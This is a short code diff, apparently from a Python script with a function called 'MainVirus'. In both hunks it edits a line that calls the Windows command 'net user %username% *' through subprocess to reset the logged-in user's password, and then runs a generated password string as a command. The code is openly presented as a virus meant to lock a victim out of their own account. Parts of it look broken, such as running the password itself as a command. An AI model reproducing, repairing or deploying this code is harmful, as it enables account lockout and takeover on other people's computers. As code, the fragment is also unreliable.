@@ -23,7 +23,7 @@ password = "".join(temp)
 
 def MainVirus():
     Name = sb.check_output(['echo', '%username%'])
-    PasswordReset = sb.check_output(['net', 'user', Name, '*'])
+    PasswordReset = sb.check_output(['net', 'user', '%username%', '*'])
     One = sb.check_output([password])
     Two = sb.check_output([password])
 MainVirus()
@@ -87,7 +87,7 @@ password = "".join(temp)
 
 def MainVirus():
     Name = sb.check_output(['echo', '%username%'])
-    PasswordReset = sb.check_output(['net', 'user', Name, '*'])
+    PasswordReset = sb.check_output(['net', 'user', '%username%', '*'])
     One = sb.check_output([password])
     Two = sb.check_output([password])
 MainVirus()
